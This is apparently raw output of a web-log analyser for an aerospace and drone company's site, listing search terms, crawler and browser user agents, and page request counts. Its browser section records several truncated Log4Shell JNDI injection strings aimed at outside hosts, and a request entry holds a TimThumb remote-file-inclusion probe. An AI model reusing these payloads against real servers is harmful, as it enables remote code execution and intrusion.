n	Rq	2	14.716	satisfaction
n	Rq	2	29.432	x
n	Rq	1	14.716	crews
n	Rq	3	14.716	photos
n	Rq	1	14.716	finnemeccia
n	Rq	2	29.432	glass
n	Rq	1	44.148	to
n	Rq	1	14.716	gcs
n	Rq	5	73.580	engineer
n	Rq	1	14.716	government
n	Rq	1	14.716	operator
n	Rq	6	88.295	aircraft
n	Rq	1	14.716	with
n	Rq	97	29.432	number
n	Rq	4	44.148	for
n	Rq	1	14.716	december
n	Rq	2	29.432	aero
n	Rq	9	29.432	equipment
n	Rq	2	29.432	engine
n	Rq	1	14.716	mq1
n	Rq	2	29.432	wy
n	Rq	1	14.716	custum
n	Rq	1	14.716	g.t
n	Rq	1	14.716	mechanics
n	Rq	1	29.432	motors
n	Rq	1	14.716	tdw
n	Rq	32	73.580	luggage
n	Rq	1	14.716	opportunities
n	Rq	175	39.387	vuitton
n	Rq	1	14.716	show
n	Rq	1	44.148	the
n	Rq	1	14.716	luggages
n	Rq	1	14.716	stroke
n	Rq	2	14.716	explore
n	Rq	39	29.432	handbags
n	Rq	2	29.432	electric
n	Rq	1	14.716	space
n	Rq	1	29.432	air
n	Rq	1	14.716	quote
n	Rq	1	14.716	require
n	Rq	1	14.716	mpp
n	Rq	4	29.432	jobs
n	Rq	5	73.580	uas
n	Rq	1	14.716	anything
n	Rq	1	14.716	china
n	Rq	1	14.716	airplane
n	Rq	10	41.767	uav
n	Rq	2	14.716	wmaid.com
n	Rq	3	58.864	drone
n	Rq	7	103.011	fiberglass
n	Rq	2	14.716	facebook
n	Rq	1	14.716	college
n	Rq	4	58.864	onboard
n	Rq	3	29.432	gtaeronautics.com
n	Rq	1	14.716	qulificationa
n	Rq	21	85.915	simi
n	Rq	1	14.716	and
n	Rq	5	44.148	flight
n	Rq	17	85.915	at6
n	Rq	1	14.716	xtreme
n	Rq	1	14.716	maintenance
n	Rq	1	14.716	cody
n	Rq	1	14.716	systems
n	Rq	1	14.716	any
n	Rq	1	14.716	tom
n	Rq	1	14.716	payload
n	Rq	2	29.432	gta
n	Rq	2	14.716	granger
n	Rq	8	103.011	extreme
n	Rq	6	73.580	molding
n	Rq	2	14.716	easylifeapp
n	Rq	1	14.716	rating
n	Rq	2	14.716	whitelaw
n	Rq	126	103.011	fashion
n	Rq	2	29.432	ice
n	Rq	2	14.716	http://www.gtaeronautics.com/compnews.html
n	Rq	5	29.432	engineers
n	Rq	3	29.432	composite
n	Rq	1	14.716	skyforce
n	Rq	1	14.716	eengineer
n	Rq	175	39.387	louis
n	Rq	8	14.716	store
n	Rq	4	58.864	starter
n	Rq	14	58.864	cheap
n	Rq	1	14.716	diamond
n	Rq	10	27.052	bme
n	Rq	1	14.716	america2009
n	Rq	7	14.716	content
n	Rq	1	14.716	challenge
n	Rq	2	29.432	aeronautic
n	Rq	1	14.716	piece
n	Rq	1	14.716	how
n	Rq	1	14.716	male
n	Rq	2	29.432	design
n	Rq	2	29.432	flying
n	Rq	1	14.716	carbon
n	Rq	1	14.716	operation
n	Rq	2	14.716	profile
n	Rq	1	14.716	tomas
n	Rq	1	14.716	cia
n	Rq	1	14.716	hummingbird
n	Rq	1	14.716	iron
n	Rq	1	14.716	california
n	Rq	1	14.716	amphibian
n	Rq	1	14.716	110
n	Rq	1	14.716	mentioned
n	Rq	1	14.716	111
n	Rq	1	14.716	over
n	Rq	25	7.575	http://www.gtaeronautics.com/
n	Rq	1	14.716	google.com
n	Rq	1	14.716	fuel
n	Rq	2	14.716	inc
n	Rq	1	14.716	handbag.com
n	Rq	1	14.716	da42
n	Rq	2	29.432	certification
n	Rq	1	14.716	timing
n	Rq	1	14.716	2015
n	Rq	1	14.716	home
n	Rq	1	14.716	aerospacecompanies
n	Rq	1	14.716	anti
n	Rq	1	14.716	ziroli
n	Rq	1	14.716	sketches
n	Rq	5	14.716	purses
n	Rq	1	14.716	downlink
n	Rq	3	14.716	aeronotics
n	Rq	1	14.716	nanotechnology
n	Rq	1	14.716	zephyr
n	Rq	4	14.716	wyoming
n	Rq	2	14.716	technology
n	Rq	3	44.148	companies
n	Rq	1	14.716	muffler
n	Rq	2	14.716	avia
n	Rq	2	14.716	what
n	Rq	145	68.819	valley
n	Rq	1	14.716	microwave
n	Rq	1	14.716	mold
n	Rq	5	58.864	pglm
n	Rq	1	14.716	specialist
n	Rq	23	83.535	drawing
n	Rq	1	14.716	tool
n	Rq	1	14.716	security
n	Rq	6	29.432	prototypes
n	Rq	1	14.716	giant
n	Rq	1	14.716	powell
n	Rq	8	103.011	aerospace
n	Rq	4	58.864	unmanned
n	Rq	34	66.439	aeronautics
n	Rq	1	14.716	radius
n	Rq	1	14.716	zero
n	Rq	1	14.716	tobbot
n	Rq	2	29.432	job
n	Rq	2	29.432	neverfull
n	Rq	1	14.716	onbordstarter
n	Rq	20	58.864	ca
n	Rq	1	29.432	as
n	Rq	13	85.915	at
n	Rq	5	73.580	techniques
n	Rq	1	14.716	does
n	Rq	1	14.716	commercial
n	Rq	1	14.716	www.gt
n	Rq	1	14.716	de
n	Rq	1	14.716	co
n	Rq	1	14.716	speedy
n	Rq	1	14.716	rpas
n	Rq	2	29.432	instrument
n	Rq	1	14.716	do
n	Rq	1	14.716	quotation
n	Rq	3	44.148	training
n	Rq	1	14.716	efi
n	Rq	1	14.716	careers
n	Rq	3	44.148	pilot
n	Rq	9	12.336	bandito
n	Rq	4	58.864	quotes
n	Rq	107	58.864	phone
n	Rq	1	14.716	stations
n	Rq	1	14.716	traing
N	*FR	2013	12	19	00	28
N	*LR	2020	10	14	09	11
N	*f	-200Q	s
N	RQ	20	4100959670	gt aeronautics
N	RQ	7	3598254414	bme extreme
N	RQ	7	3598254414	aerospace engineering drawings
N	RQ	20	2998545345	www.gtaeronautics.com
N	RQ	14	2901541532	aeronautical engineering drawing
N	RQ	6	2398836276	texan at6
N	RQ	5	2398836276	bandito pglm
N	RQ	3	1799127207	bandito uav
N	RQ	3	1799127207	onboard starter
N	RQ	2	1199418138	fiberglass molding techniques
N	RQ	6	1199418138	manufacturing aeronautical prototypes
N	RQ	19	1199418138	louis vuitton luggage outlet
N	RQ	10	1199418138	louis vuitton fashion valley phone
N	RQ	97	1199418138	louis vuitton fashion valley phone number
N	RQ	2	1199418138	texan at 6
N	RQ	18	1199418138	louis vuitton fashion valley ca
N	RQ	9	1102414325	at 6 texan
N	RQ	1	599709069	uavs flying over simi valley ca
N	RQ	1	599709069	gt aeronautics simi valley california
N	RQ	1	599709069	aeronautical engineer quote
N	RQ	1	599709069	does aeronautical engineering require drawing?
N	RQ	1	599709069	how to do gt in engineering drawing
N	RQ	2	599709069	http://gtaeronautics.com/
N	RQ	1	599709069	the government college g.t aeronautics
N	RQ	1	599709069	bme engine
N	RQ	1	599709069	uas gcs
N	RQ	1	599709069	http://www.gtaeronautics.com/indnews.html
N	RQ	92	599709069	semalt.com
N	RQ	1	599709069	aero iron mentioned nanotechnology hummingbird uav
N	RQ	1	599709069	basic fiberglass techniques
N	RQ	1	599709069	http://gtaeronautics.com/indnews.html
N	RQ	1	599709069	finnemeccia co
N	RQ	2	599709069	drawing for customer satisfaction
N	RQ	1	599709069	cheap louis vuitton speedy handbag.com
N	RQ	1	599709069	at 6
N	RQ	1	599709069	quotation specialist engineer drawings
N	RQ	1	599709069	challenge xtreme 111 piece mechanics tool kit
N	RQ	1	599709069	uav commercial crew stations
N	RQ	1	599709069	da42 mpp microwave downlink bandwidth
N	RQ	1	599709069	anti ice de ice qinetiq zephyr
N	RQ	4	599709069	louis%20vuitton%20fashion%20valley%20phone%20number
N	RQ	1	599709069	faa uas pilot certification
N	RQ	1	599709069	any flying crews in gta
N	RQ	1	599709069	aerospace drawing
N	RQ	1	599709069	fiber glass molding job
N	RQ	1	599709069	aircraft design consultant
N	RQ	1	599709069	www.gt airplane.com
N	RQ	3	599709069	gt in aeronotics
N	RQ	1	599709069	tom rullman
N	RQ	1	599709069	gt aeronautics simi valley ca
N	RQ	1	599709069	drone base in simi valley
N	RQ	1	599709069	fiberglass mold making techniques
N	RQ	1	599709069	rpa instrument qualification faa instrument rating
N	RQ	1	599709069	extreme bme
N	RQ	1	599709069	uas faa maintenance
N	RQ	1	599709069	louis vuitton neverfull
N	RQ	1	599709069	fiberglass techniques
N	RQ	1	599709069	aircraft companies in simi valley
N	RQ	1	599709069	custom fiberglass moldings
N	RQ	11	599709069	louis vuitton luggage cheap
N	RQ	1	599709069	anything
N	RQ	1	599709069	aeronautical engineering sketches
N	RQ	1	599709069	gtaeronautics.com
N	RQ	1	599709069	giant scale ziroli at 6
N	RQ	9	599709069	outlet louis vuitton handbags
N	RQ	1	599709069	cowling drawing
N	RQ	1	599709069	mitsubishi zero
N	RQ	1	599709069	powell wy gt aeronautics
N	RQ	2	599709069	what is gt in basic engineering drawing
N	RQ	2	599709069	composite molding
N	RQ	1	599709069	aeronautics in simi valley and security work
N	RQ	3	599709069	gt aeronautics llc jobs
N	RQ	1	599709069	crew flight gta
N	RQ	1	599709069	110cc engine timing
N	RQ	1	599709069	aeronautical engineer quotes
N	RQ	2	599709069	http://www.gtaeronautics.com/compnews.html
N	RQ	4	599709069	wyoming flight engineers
N	RQ	1	599709069	a t 6
N	RQ	1	599709069	gt aeronautics unmanned air
N	RQ	1	599709069	fia gt composite tooling
N	RQ	1	599709069	uas pilot certification
N	RQ	1	599709069	quotes on aeronautical engineers
N	RQ	1	599709069	payload for diamond northrop twin engie aircraft
N	RQ	7	599709069	content
N	RQ	1	599709069	bme 110
N	RQ	1	599709069	thomas w rullman gt aeronautics
N	RQ	1	599709069	luggages for sale
N	RQ	2	599709069	easylifeapp profile
N	RQ	2	599709069	simi gt
N	RQ	1	599709069	mq1 design fuel
N	RQ	1	599709069	airplane as always cia america2009
N	RQ	1	599709069	eengineer drawing home
N	RQ	1	599709069	heavy equipment operator jobs
N	RQ	1	599709069	aero space drone simi valley
N	RQ	1	599709069	cheap louis vuitton luggage
N	RQ	1	599709069	2 stroke electric onboard starter
N	RQ	1	599709069	skyforce observer mk3
N	RQ	1	599709069	simi valley unmanned aircraft
N	RQ	2	599709069	granger whitelaw avia
N	RQ	1	599709069	louis vuitton fashion valley neverfull
N	RQ	1	599709069	louis vuitton job opportunities
N	RQ	1	599709069	google.com
N	RQ	1	599709069	uas operation training method
N	RQ	2	599709069	wmaid.com explore gtaeronautics.com
N	RQ	1	599709069	custum muffler 110cc
N	RQ	1	599709069	glass manufacturing drawings
N	RQ	1	599709069	electric motors x male uav x sale
N	RQ	1	599709069	aerospacecompanies in simi valley
N	RQ	1	599709069	fiberglass molding
N	RQ	2	599709069	aeronautical technology inc
N	RQ	1	599709069	taranis ucav
N	RQ	1	599709069	vegas drone uav show december 2015
N	RQ	1	599709069	uav companies in simi valley
N	RQ	1	599709069	unmanned aircraft systems pilot training
N	RQ	2	599709069	installerex facebook
N	RQ	3	599709069	texan at6 photos
N	RQ	1	599709069	aeronautic engineer
N	RQ	30	599709069	designer handbags outlet sale
N	RQ	1	599709069	rpas qulificationa traing with faa
N	RQ	1	599709069	faa uav training
N	RQ	1	599709069	uav companies simi valley
N	RQ	5	599709069	louis vuitton purses outlet
N	RQ	1	599709069	aeronautics
N	RQ	1	599709069	cheap louis vuitton luggage outlet
N	RQ	1	599709069	gt aeronautics tomas rullman
N	RQ	1	599709069	tobbot
N	RQ	1	599709069	radius tdw efi fuze
N	RQ	8	599709069	manufacturing equipment store in simi valley
N	RQ	1	599709069	aeronautic engineer quotes
N	RQ	1	599709069	onbordstarter
N	RQ	1	599709069	rotax amphibian unmanned china
N	RQ	1	599709069	aeronautical engineering quotes
N	RQ	1	599709069	drawing aircraft engineering
N	RQ	1	599709069	gt aeronautics careers
N	RQ	1	599709069	gt aeronautics bandito
N	RQ	1	599709069	cody wy carbon fiber
N	RQ	8	502705256	at6 texan
N	RQ	25	308697630	http://www.gtaeronautics.com/
B	*f	-40R	r
B	Rb	89883	0.000	Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
B	Rb	75758	2.898	Mozilla/5.0 (compatible; AhrefsBot/7.0;  http://ahrefs.com/robot/)
B	Rb	64595	1.116	Sogou web spider/4.0( http://www.sogou.com/docs/help/webmasters.htm#07)
B	Rb	61016	1.638	ZoominfoBot (zoominfobot at zoominfo dot com)
B	Rb	46695	1.266	Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)
B	Rb	40898	4.266	Mozilla/5.0 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)
B	Rb	19336	2.168	Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1736.0 Safari/537.36
B	Rb	16850	0.266	Googlebot-Image/1.0
B	Rb	16326	0.954	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
B	Rb	15322	0.333	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1;  http://www.apple.com/go/applebot)
B	Rb	13884	1.399	Mozilla/5.0 (compatible; YandexBot/3.0;  http://yandex.com/bots)
B	Rb	13163	0.000	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
B	Rb	12964	1.355	Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)
B	Rb	12398	0.000	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
B	Rb	11579	0.689	Mozilla/5.0 (compatible; Baiduspider/2.0;  http://www.baidu.com/search/spider.html)
B	Rb	10314	0.616	Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
B	Rb	9734	0.000	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
B	Rb	9648	0.435	Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36
B	Rb	9318	0.000	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
B	Rb	8838	0.000	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
B	Rb	8405	0.000	Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36
B	Rb	8326	0.000	Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; spider-feedback@bytedance.com)
B	Rb	8061	0.886	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
B	Rb	8049	0.067	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
B	Rb	7734	0.000	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
B	Rb	7609	0.424	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
B	Rb	7504	0.408	Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
B	Rb	7483	0.190	Mozilla/5.0 (compatible; BLEXBot/1.0;  http://webmeup-crawler.com/)
B	Rb	7221	0.210	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
B	Rb	7181	0.200	Mozilla/4.0 (compatible;)
B	Rb	6720	0.400	Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0
B	Rb	6488	0.307	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
B	Rb	6290	0.000	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
B	Rb	6171	0.479	PRurl
B	Rb	6164	0.044	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
B	Rb	6152	0.345	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
B	Rb	6079	0.224	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
B	Rb	5955	0.246	Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)
B	Rb	5934	0.000	Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
B	Rb	5848	0.260	Sosospider ( http://help.soso.com/webspider.htm)
B	Rb	1221883	75.910	[not listed: 22472]
b	*f	-15Q	s
b	lRQq	1	427780	3678653273	107.142	Netscape (compatible)
b	lRQq	1	1482	2998545356	87.334	facebookexternalhit
b	lRQq	2	1482	2998545356	87.334	facebookexternalhit/1
b	lRQq	1	5227	3633626797	105.831	python-requests
b	lRQq	2	5209	1931503403	56.256	python-requests/2
b	lRQq	2	6	1199418138	34.933	python-requests/0
b	lRQq	2	12	502705256	14.641	python-requests/1
b	lRQq	1	262619	3148682474	91.707	MSIE
b	lRQq	2	14737	2778278670	80.918	MSIE/9
b	lRQq	2	101149	4237119191	123.408	MSIE/7
b	lRQq	2	4922	670453833	19.527	MSIE/10
b	lRQq	2	39069	3388182022	98.682	MSIE/8
b	lRQq	2	405	2998545345	87.334	MSIE/3
b	lRQq	2	6378	2143197219	62.421	MSIE/5
b	lRQq	2	439	1702123394	49.575	MSIE/4
b	lRQq	2	728	1199418138	34.933	MSIE/2
b	lRQq	2	92711	805532403	23.461	MSIE/6
b	lRQq	2	27	599709069	17.467	MSIE/11
b	lRQq	1	171	3906952046	113.791	Screaming Frog SEO Spider
b	lRQq	2	10	599709071	17.467	Screaming Frog SEO Spider/20
b	lRQq	2	15	1799127207	52.400	Screaming Frog SEO Spider/13
b	lRQq	2	68	1799127207	52.400	Screaming Frog SEO Spider/9
b	lRQq	2	29	1799127207	52.400	Screaming Frog SEO Spider/18
b	lRQq	2	3	1199418138	34.933	Screaming Frog SEO Spider/12
b	lRQq	2	3	1199418138	34.933	Screaming Frog SEO Spider/16
b	lRQq	2	4	1199418138	34.933	Screaming Frog SEO Spider/8
b	lRQq	2	4	1199418138	34.933	Screaming Frog SEO Spider/17
b	lRQq	2	17	1199418138	34.933	Screaming Frog SEO Spider/19
b	lRQq	2	6	599709069	17.467	Screaming Frog SEO Spider/10
b	lRQq	2	1	599709069	17.467	Screaming Frog SEO Spider/2
b	lRQq	2	2	599709069	17.467	Screaming Frog SEO Spider/3
b	lRQq	2	1	599709069	17.467	Screaming Frog SEO Spider/4
b	lRQq	2	2	599709069	17.467	Screaming Frog SEO Spider/14
b	lRQq	2	3	599709069	17.467	Screaming Frog SEO Spider/5
b	lRQq	2	1	599709069	17.467	Screaming Frog SEO Spider/6
b	lRQq	2	2	599709069	17.467	Screaming Frog SEO Spider/7
b	lRQq	1	27	4197963483	122.267	${${lower:jndi}:${lower:rmi}:
b	lRQq	2	6	1199418138	34.933	${${lower:jndi}:${lower:rmi}://144
b	lRQq	2	4	1199418138	34.933	${${lower:jndi}:${lower:rmi}://51
b	lRQq	2	10	599709069	17.467	${${lower:jndi}:${lower:rmi}://188
b	lRQq	2	3	599709069	17.467	${${lower:jndi}:${lower:rmi}://185
b	lRQq	2	4	599709069	17.467	${${lower:jndi}:${lower:rmi}://167
b	lRQq	1	122	4197963483	122.267	MSIE or
b	lRQq	1	2169	3712944418	108.141	Safari
b	lRQq	2	92	2998545345	87.334	Safari/18614
b	lRQq	2	222	2398836276	69.867	Safari/19616
b	lRQq	2	156	2398836276	69.867	Safari/19617
b	lRQq	2	17	1799127207	52.400	Safari/17613
b	lRQq	2	7	1799127207	52.400	Safari/16614
b	lRQq	2	2	1199418138	34.933	Safari/14606
b	lRQq	2	427	1199418138	34.933	Safari/19618
b	lRQq	2	20	1199418138	34.933	Safari/12604
b	lRQq	2	2	599709069	17.467	Safari/16612
b	lRQq	2	4	599709069	17.467	Safari/17612
b	lRQq	2	19	599709069	17.467	Safari/17614
b	lRQq	2	4	599709069	17.467	Safari/15609
b	lRQq	2	1	599709069	17.467	Safari/11601
b	lRQq	2	1	599709069	17.467	Safari/10603
b	lRQq	2	2	599709069	17.467	Safari/11604
b	lRQq	2	3	599709069	17.467	Safari/16610
b	lRQq	2	12	599709069	17.467	Safari/537
b	lRQq	2	1178	502705256	14.641	Safari/18615
b	lRQq	1	96	3598254414	104.800	WWW-Mechanize
b	lRQq	2	95	2998545345	87.334	WWW-Mechanize/1
b	lRQq	2	1	599709069	17.467	WWW-Mechanize/0
b	lRQq	1	55	3501250601	101.975	PHP-Curl-Class
b	lRQq	2	11	1799127207	52.400	PHP-Curl-Class/8
b	lRQq	2	44	1702123394	49.575	PHP-Curl-Class/9
b	lRQq	1	54	3501250601	101.975	Google
b	lRQq	2	50	2301832463	67.042	Google/2
b	lRQq	2	4	1199418138	34.933	Google/1
b	lRQq	1	277	3404246788	99.150	Chrome
b	lRQq	2	4	599709069	17.467	Chrome/13
b	lRQq	2	12	599709069	17.467	Chrome/41
b	lRQq	2	1	599709069	17.467	Chrome/33
b	lRQq	2	1	599709069	17.467	Chrome/70
b	lRQq	2	12	599709069	17.467	Chrome/66
b	lRQq	2	14	599709069	17.467	Chrome/95
b	lRQq	2	12	599709069	17.467	Chrome/120
b	lRQq	2	30	599709069	17.467	Chrome/121
b	lRQq	2	50	599709069	17.467	Chrome/112
b	lRQq	2	22	599709069	17.467	Chrome/122
b	lRQq	2	6	599709069	17.467	Chrome/113
b	lRQq	2	24	599709069	17.467	Chrome/114
b	lRQq	2	12	599709069	17.467	Chrome/123
b	lRQq	2	3	599709069	17.467	Chrome/105
b	lRQq	2	12	599709069	17.467	Chrome/115
b	lRQq	2	2	599709069	17.467	Chrome/108
b	lRQq	2	2	599709069	17.467	Chrome/109
b	lRQq	2	24	599709069	17.467	Chrome/118
b	lRQq	1	117	3404246788	99.150	NSPlayer
b	lRQq	2	16	2398836276	69.867	NSPlayer/10
b	lRQq	2	17	2398836276	69.867	NSPlayer/9
b	lRQq	2	5	1199418138	34.933	NSPlayer/12
b	lRQq	2	78	1102414325	32.108	NSPlayer/11
b	lRQq	2	1	599709069	17.467	NSPlayer/8
b	lRQq	1	33	3404246788	99.150	WordPress
b	lRQq	2	19	3501250601	101.975	WordPress/4
b	lRQq	2	13	2398836276	69.867	WordPress/3
b	lRQq	2	1	1799127207	52.400	WordPress/6
b	lRQq	1	143	3113235349	90.674	MobileSafari
b	lRQq	2	26	2998545345	87.334	MobileSafari/8614
b	lRQq	2	3	2998545345	87.334	MobileSafari/602
b	lRQq	2	80	1799127207	52.400	MobileSafari/8615
b	lRQq	2	1	1799127207	52.400	MobileSafari/601
b	lRQq	2	19	1605119581	46.750	MobileSafari/604
b	lRQq	2	6	1199418138	34.933	MobileSafari/8612
b	lRQq	2	2	1199418138	34.933	MobileSafari/9537
b	lRQq	2	6	599709069	17.467	MobileSafari/8617
b	lRQq	1	1219404	1570978050	45.755	[not listed: 944]
p	*f	0Q	s
p	lR	1	923140	Windows
p	lR	2	261293	Windows NT
p	lR	2	393812	Unknown Windows
p	lR	2	251691	Windows XP
p	lR	2	2238	Windows 95
p	lR	2	414	Windows CE
p	lR	2	2379	Windows 98
p	lR	2	9499	Windows 2000
p	lR	2	384	Windows 3.1
p	lR	2	1430	Windows ME
p	lR	1	383793	OS unknown
p	lR	1	202919	Macintosh
p	lR	2	198255	Unknown Macintosh
p	lR	2	1404	Macintosh 68k
p	lR	2	3260	Macintosh PowerPC
p	lR	1	160128	Unix
p	lR	2	156084	Linux
p	lR	2	68	BSD
p	lR	2	22	SunOS
p	lR	2	3951	Other Unix
p	lR	2	3	HP-UX
p	lR	1	249713	Known robots
p	lR	1	16	WebTV
p	lR	1	13	BeOS
p	lR	1	47	OS/2
p	lR	1	7	Amiga
i	*f	0R	s
i	lRc	1	704950	0.000	/images/
i	lRc	1	953827	0.000	[root directory]
i	lRc	1	172587	0.000	/js/
i	lRc	1	88363	0.000	/css/
i	lRc	1	11870	0.000	/uploads/
i	lRc	1	865	0.000	/videos/
i	lRc	1	541	0.000	/client/
i	lRc	1	1	0.000	/cgi-bin/
i	lRc	1	260	0.000	/dev/
i	lRc	2	24	0.000	/dev/css/
i	lRc	2	46	0.000	/dev/js/
i	lRc	2	81	0.000	/dev/images/
i	lRc	1	1	0.000	/secure/
i	lRc	1	74	0.000	/stats/
r	*f	0.050000%S	s
r	lRSc	1	40451	29	0.000	/aboutus.html
r	lRSc	1	28751	23	0.000	/contactus.html
r	lRSc	1	33267	21	0.000	/links.html
r	lRSc	1	12937	19	0.000	/gt380+rpas.html
r	lRSc	1	26130	19	0.000	/consultinga.html
r	lRSc	1	36441	19	0.000	/compnews.html
r	lRSc	1	29853	16	0.000	/uasfc.html
r	lRSc	1	16784	16	0.000	/sru.html
r	lRSc	1	12166	15	0.000	/gt50t+rpas.html
r	lRSc	1	24674	15	0.000	/cfmt.html
r	lRSc	1	8256	15	0.000	/gt100hl+rpas.html
r	lRSc	1	22734	14	0.000	/pna.html
r	lRSc	1	19605	14	0.000	/faq.html
r	lRSc	1	22135	13	0.000	/indevents.html
r	lRSc	1	20934	13	0.000	/employment.html
r	lRSc	1	25841	13	0.000	/cct&m.html
r	lRSc	1	31483	11	0.000	/indnews.html
r	lRSc	2	141	0	0.000	/indnews.html?referer=www.clickfind.com.au/wp-login.php
r	lRSc	2	1	0	0.000	/indnews.html?referer=top1.co.pl
r	lRSc	2	1	0	0.000	/indnews.html?referer=www.clickfind.com.au//wp-content/themes/busybee/thumb.php?src=http://blogger.com.opontodaarte.com.br/java.php
r	lRSc	1	12589	11	0.000	/gt1500+rpas.html
r	lRSc	1	13781	8	0.000	/rd.html
r	lRSc	1	1055	4	0.000	/uploads/bighornbasindronefestivalflyer-v2-220110.pdf
r	lRSc	1	1864	2	0.000	/uploads/idrone-pressrelease-powell-version220119.pdf
r	lRSc	1	4646	2	0.000	/uavengines.html
r	lRSc	1	4097	2	0.000	/bandituas.html
r	lRSc	1	4485	1	0.000	/banditomav.html
r	lRSc	1	1209	1	0.000	/uploads/big+horn+basin+drone+festival+event+schedule.pdf
r	lRSc	1	869	1	0.000	/uploads/2022wydronefestflyer+rev2.pdf
r	lRSc	1	4413	1	0.000	/gtatexan.html
r	lRSc	1	1	0	0.000	/client/bandito timeline2007.html
r	lRSc	1	2	0	0.000	/client/bandit+timeline2004.html
r	lRSc	1	1	0	0.000	/stats/quick.html
r	lRSc	1	1	0	0.000	/404.htm
r	lRSc	1	12	0	0.000	/client/gta010707002.html
r	lRSc	1	72	0	0.000	/client/bandito+development.html
r	lRSc	1	135	0	0.000	/client/welcome.html
r	lRSc	1	3	0	0.000	/client/gta021305001.html
r	lRSc	1	1	0	0.000	/stats/browserrep.html
r	lRSc	1	741	0	0.000	/gt50t rpas.html
r	lRSc	1	5	0	0.000	/client/gta012405001.html
r	lRSc	1	2	0	0.000	/dev/contactus.html
r	lRSc	1	4	0	0.000	/stats/general.html
r	lRSc	1	1	0	0.000	/stats/dailyrep.html
r	lRSc	1	1	0	0.000	/dev/aboutus.html
r	lRSc	1	18	0	0.000	/client/tacamo+development.html
r	lRSc	1	1	0	0.000	/client/bandit development.html
r	lRSc	1	17	0	0.000	/client/bandit+timeline2008.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2005.html
r	lRSc	1	23	0	0.000	/client/projectbids.html
r	lRSc	1	1	0	0.000	/stats/host.html
r	lRSc	1	11	0	0.000	/client/rq2+outlaw.html
r	lRSc	1	1	0	0.000	/client/bandit timeline2008.html
r	lRSc	1	20	0	0.000	/client/clientpna.html
r	lRSc	1	15	0	0.000	/client/bandit.html
r	lRSc	1	1150	0	0.000	/uploads/droneexpojan2022+(1).pdf
r	lRSc	1	2	0	0.000	/stats/default.asp
r	lRSc	1	21	0	0.000	/index.htm
r	lRSc	1	1	0	0.000	/cgi-bin/testms.pl
r	lRSc	1	987	0	0.000	/gtamt.html
r	lRSc	1	14	0	0.000	/client/rq1+bandit.html
r	lRSc	1	2253	0	0.000	/gt1500 rpas.html
r	lRSc	1	6	0	0.000	/client/gta021305002.html
r	lRSc	1	4	0	0.000	/client/gta121004001.html
r	lRSc	1	24	0	0.000	/client/tacamo.html
r	lRSc	1	30	0	0.000	/client/mgqgcyat.asp
r	lRSc	1	1	0	0.000	/dev/client.cgi
r	lRSc	1	18702	0	0.000	/default.asp
r	lRSc	1	1666	0	0.000	/gt380 rpas.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2006.html
r	lRSc	1	16	0	0.000	/client/rq3+bandito.html
r	lRSc	1	1	0	0.000	/dev/uasfc.html
